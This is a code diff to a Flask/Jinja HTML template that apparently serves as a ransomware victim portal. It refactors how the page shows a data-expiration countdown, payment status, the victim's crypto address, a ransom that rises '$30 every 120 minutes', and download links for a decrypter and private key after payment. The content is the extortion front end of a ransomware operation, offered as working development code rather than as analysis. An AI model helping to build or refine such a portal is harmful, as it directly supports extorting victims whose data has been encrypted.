@@ -73,7 +73,7 @@
 
 <div class="container mt-5">
     <div class="header text-center">
-        <h1>{% if paid_user %}Payment Success{% else %}Data Expiration{% endif %}</h1>
+        <h1>{% if user.status %}Payment Success{% else %}Data Expiration{% endif %}</h1>
         {% if user %}
             <div class="countdown">
                 <span id="hours">00 hours</span>
@@ -94,25 +94,27 @@
         <tbody>
         <tr>
             <td>Payment status</td>
-            <td>{{ paid_user.status if paid_user else user.status }}</td>
+            <td>{{ user.status }}</td>
         </tr>
         <tr>
             <td>Total Payment</td>
-            <td>{{ paid_user.total_payment if paid_user else user.total_payment }}</td>
+            <td>{{ user.total_payment }}</td>
         </tr>
         <tr>
             <td>Amount Paid</td>
-            <td>{{ paid_user.amount_paid if paid_user else user.amount_paid }}</td>
+            <td>{{ user.amount_paid }}</td>
         </tr>
+
         <tr>
-            {% if paid_user %}
+            {% if user.status %}
                 <td>Payment Date</td>
-                <td>{{ date(paid_user.payment_date) }}</td>
+                <td>{{ date(user.payment_date) }}</td>
             {% else %}
                 <td>Deadline</td>
                 <td>{{ date(user.expiration) }}</td>
             {% endif %}
         </tr>
+
         <tr>
             <td>Payment increase</td>
             <td>Your payment will increase by $30 every 120 minutes.</td>
@@ -150,7 +152,7 @@
 
         <tr>
             <td>Crypto address</td>
-            <td>{{ paid_user.crypto_address if paid_user else user.crypto_address }}</td>
+            <td>{{ user.crypto_address }}</td>
         </tr>
 
         </tbody>
@@ -158,10 +160,10 @@
 
     <hr>
     <footer>
-        {% if paid_user %}
-            <a href="{{ url_for('download_decrypter', uid=paid_user.uid) }}" class="btn btn-primary">Download
+        {% if user.status %}
+            <a href="{{ url_for('download_decrypter', uid=user.uid) }}" class="btn btn-primary">Download
                 decrypter</a>
-            <a href="{{ url_for('download_private_key', uid=paid_user.uid) }}" class="btn btn-secondary">Private Key</a>
+            <a href="{{ url_for('download_private_key', uid=user.uid) }}" class="btn btn-secondary">Private Key</a>
         {% endif %}
     </footer>
 
@@ -330,7 +332,7 @@ function showAlert(type, message) {
     {% endif %}
 
     <br><br>
-    {% if user %}
+    {% if not user.status %}
         <h3>Instructions:</h3>
         <p>
             On the other hand, we denounce with righteous indignation and dislike men who are so beguiled
